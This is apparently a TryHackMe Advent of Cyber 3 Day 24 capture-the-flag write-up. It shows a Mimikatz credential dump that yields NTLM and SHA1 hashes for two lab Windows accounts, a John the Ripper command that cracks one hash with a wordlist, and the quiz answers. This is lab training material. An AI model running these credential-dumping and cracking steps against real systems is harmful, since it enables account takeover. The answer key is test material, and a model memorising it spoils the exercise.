# TryHackMe [Advent of Cyber 3](https://tryhackme.com/room/adventofcyber3) Day 24

```powershell
PS C:\Users\Administrator> .\Desktop\mimikatz\x64\
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 291196 (00000000:0004717c)
Session           : RemoteInteractive from 2
User Name         : Administrator
Domain            : THM
Logon Server      : THM
Logon Time        : 12/25/2021 2:31:33 AM
SID               : S-1-5-21-1966530601-3185510712-10604624-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : THM
         * NTLM     : 001a5b3e266374c0df96a298f7f7419f
         * SHA1     : 6a6be7a1f14813295de2335bb8d1deadcfb57704
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : THM
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : THM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 464828 (00000000:000717bc)
Session           : Interactive from 0
User Name         : emily
Domain            : THM
Logon Server      : THM
Logon Time        : 12/25/2021 2:31:54 AM
SID               : S-1-5-21-1966530601-3185510712-10604624-1009
        msv :
         [00000003] Primary
         * Username : emily
         * Domain   : THM
         * NTLM     : 8af326aa4850225b75c592d4ce19ccf5
         * SHA1     : 8c4c6c4e493ec2beef5f6f6a9c4472c13bed42e8
        tspkg :
        wdigest :
         * Username : emily
         * Domain   : THM
         * Password : (null)
        kerberos :
         * Username : emily
         * Domain   : THM
         * Password : (null)
        ssp :
        credman :

mimikatz #
```

## What is the username of the other user on the system?
**Answer**: `emily`
## What is the NTLM hash of this user?
**Answer**: `8af326aa4850225b75c592d4ce19ccf5`
## What is the password for this user?
```bash
$ john --format=NT -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash.txt --pot=output.txt && cat output.txt
$NT$8af326aa4850225b75c592d4ce19ccf5:1234567890
```

**Answer**: `1234567890`